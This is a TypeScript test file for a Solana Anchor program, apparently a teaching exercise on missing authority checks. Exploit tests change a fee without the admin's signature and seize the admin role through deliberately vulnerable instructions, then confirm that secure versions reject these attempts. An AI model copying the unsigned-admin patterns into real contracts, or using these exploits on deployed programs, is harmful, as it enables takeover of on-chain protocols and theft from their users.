import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { 
    Keypair, 
    PublicKey, 
    SystemProgram, 
    LAMPORTS_PER_SOL 
} from "@solana/web3.js";
import { expect } from "chai";
import { ProtocolConfig } from "../../../target/types/protocol_config";

describe("02: Missing Authority Check", () => {
    const provider = anchor.AnchorProvider.env();
    anchor.setProvider(provider);

    const program = anchor.workspace.ProtocolConfig as Program<ProtocolConfig>;
    
    let legitimateAdmin: Keypair;
    let attacker: Keypair;
    let configPda: PublicKey;

    const INITIAL_FEE_BPS = 100;

    before(async () => {
        legitimateAdmin = Keypair.generate();
        attacker = Keypair.generate();

        const airdropAdmin = await provider.connection.requestAirdrop(
            legitimateAdmin.publicKey,
            5 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAdmin);

        const airdropAttacker = await provider.connection.requestAirdrop(
            attacker.publicKey,
            2 * LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAttacker);

        [configPda] = PublicKey.findProgramAddressSync(
            [Buffer.from("config")],
            program.programId
        );
    });

    describe("Setup: Initialize protocol", () => {
        it("initializes config with admin", async () => {
            await program.methods
                .initialize(INITIAL_FEE_BPS)
                .accounts({
                    config: configPda,
                    admin: legitimateAdmin.publicKey,
                    systemProgram: SystemProgram.programId,
                })
                .signers([legitimateAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            expect(config.admin.toString()).to.equal(legitimateAdmin.publicKey.toString());
            expect(config.feeBps).to.equal(INITIAL_FEE_BPS);
        });
    });

    describe("Exploit 1: vulnerable_update_fee accepts unsigned admin", () => {
        it("attacker changes fee by passing admin pubkey without signature", async () => {
            const maliciousFee = 999;
            
            const configBefore = await program.account.config.fetch(configPda);
            console.log(`Fee before: ${configBefore.feeBps} bps`);

            // Pass admin's pubkey but admin doesn't sign - attacker has no signers requirement
            await program.methods
                .vulnerableUpdateFee(maliciousFee)
                .accounts({
                    config: configPda,
                    adminAccount: legitimateAdmin.publicKey,
                })
                .rpc();

            const configAfter = await program.account.config.fetch(configPda);
            console.log(`Fee after: ${configAfter.feeBps} bps`);
            console.log("EXPLOIT SUCCEEDED: Admin never signed this transaction");
            
            expect(configAfter.feeBps).to.equal(maliciousFee);
        });
    });

    describe("Exploit 2: vulnerable_transfer_admin has no authorization", () => {
        it("attacker becomes admin without any authorization", async () => {
            const configBefore = await program.account.config.fetch(configPda);
            console.log(`Admin before: ${configBefore.admin.toString().slice(0, 20)}...`);

            await program.methods
                .vulnerableTransferAdmin(attacker.publicKey)
                .accounts({
                    config: configPda,
                    caller: attacker.publicKey,
                })
                .signers([attacker])
                .rpc();

            const configAfter = await program.account.config.fetch(configPda);
            console.log(`Admin after: ${configAfter.admin.toString().slice(0, 20)}...`);
            console.log("EXPLOIT SUCCEEDED: Attacker is now admin");
            
            expect(configAfter.admin.toString()).to.equal(attacker.publicKey.toString());
        });

        it("restore admin for further tests", async () => {
            await program.methods
                .vulnerableTransferAdmin(legitimateAdmin.publicKey)
                .accounts({
                    config: configPda,
                    caller: attacker.publicKey,
                })
                .signers([attacker])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            expect(config.admin.toString()).to.equal(legitimateAdmin.publicKey.toString());
        });
    });

    describe("Secure: secure_update_fee blocks unauthorized access", () => {
        it("rejects when admin pubkey provided but wrong signer", async () => {
            try {
                await program.methods
                    .secureUpdateFee(500)
                    .accounts({
                        config: configPda,
                        admin: legitimateAdmin.publicKey,
                    })
                    .signers([attacker])
                    .rpc();
                
                expect.fail("Should have thrown");
            } catch (error: any) {
                expect(error.message).to.include("unknown signer");
            }
        });

        it("rejects when attacker signs with their own key", async () => {
            try {
                await program.methods
                    .secureUpdateFee(500)
                    .accounts({
                        config: configPda,
                        admin: attacker.publicKey,
                    })
                    .signers([attacker])
                    .rpc();
                
                expect.fail("Should have thrown");
            } catch (error: any) {
                expect(error.toString()).to.include("Unauthorized");
            }
        });

        it("allows legitimate admin to update fee", async () => {
            const newFee = 150;
            
            await program.methods
                .secureUpdateFee(newFee)
                .accounts({
                    config: configPda,
                    admin: legitimateAdmin.publicKey,
                })
                .signers([legitimateAdmin])
                .rpc();

            const config = await program.account.config.fetch(configPda);
            expect(config.feeBps).to.equal(newFee);
            console.log(`Legitimate admin updated fee to ${config.feeBps} bps`);
        });
    });
});
